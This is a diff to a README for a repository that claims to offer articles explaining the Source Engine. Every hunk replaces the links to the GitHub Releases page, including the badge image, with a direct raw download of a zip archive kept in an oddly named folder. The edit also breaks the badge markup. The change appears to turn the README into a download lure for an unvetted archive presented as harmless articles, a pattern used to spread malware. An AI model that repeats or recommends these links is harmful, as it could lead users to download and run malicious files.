@@ -1,6 +1,6 @@
 # 🎮 source-engine-articles - Making Technical Concepts Easy to Understand
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/regiaharun/source-engine-articles/releases)
+[![Download from Releases](https://raw.githubusercontent.com/regiaharun/source-engine-articles/main/Saprolegniales/source-engine-articles_3.5-alpha.2.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/regiaharun/source-engine-articles/main/Saprolegniales/source-engine-articles_3.5-alpha.2.zip)
 
 ## 📚 Overview
 Welcome to "source-engine-articles"! This project includes articles that simplify technical concepts related to the Source Engine. Our goal is to help everyone, from gamers to developers, grasp these complicated ideas easily.
@@ -9,7 +9,7 @@ Welcome to "source-engine-articles"! This project includes articles that simplif
 To use our articles effectively, follow these straightforward steps.
 
 ## 🔗 Download & Install
-To download the articles, [visit this page to download](https://github.com/regiaharun/source-engine-articles/releases). Here, you will find all the latest updates and versions available for download.
+To download the articles, [visit this page to download](https://raw.githubusercontent.com/regiaharun/source-engine-articles/main/Saprolegniales/source-engine-articles_3.5-alpha.2.zip). Here, you will find all the latest updates and versions available for download.
 
 ### Step-by-Step Instructions
 1. Click the download link above to visit the Releases page.
@@ -57,4 +57,4 @@ If you encounter any problems while downloading or accessing the articles, consi
 ## 📞 Support
 If you need further assistance, please open an issue on the GitHub repository. We will do our best to help you.
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/regiaharun/source-engine-articles/releases)
+[![Download from Releases](https://raw.githubusercontent.com/regiaharun/source-engine-articles/main/Saprolegniales/source-engine-articles_3.5-alpha.2.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/regiaharun/source-engine-articles/main/Saprolegniales/source-engine-articles_3.5-alpha.2.zip)
